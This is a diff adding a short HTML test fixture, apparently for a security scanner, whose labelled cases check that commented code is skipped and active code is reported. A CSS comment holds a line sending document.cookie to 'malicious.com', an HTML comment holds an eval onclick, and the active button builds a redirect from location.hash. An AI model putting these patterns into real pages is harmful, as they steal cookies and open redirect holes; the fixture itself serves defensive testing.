@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        /* 
+         * TEST 4: CSS BLOCK COMMENT (SKIP)
+         * body { background: url("http://malicious.com/?log=" + document.cookie); }
+         */
+        .panel { padding: 10px; }
+    </style>
+</head>
+<body>
+    <!-- 
+        TEST 5: HTML COMMENT (SKIP)
+        <div onclick="eval('secret_data')">Hidden Vulnerability</div>
+    -->
+    
+    <div class="main">
+        <h1>Welcome</h1>
+        <!-- TEST 6: ACTIVE CODE (REPORT) -->
+        <button onclick="window.location.href = '/login?next=' + location.hash">
+            Login
+        </button>
+    </div>
+</body>
+</html>
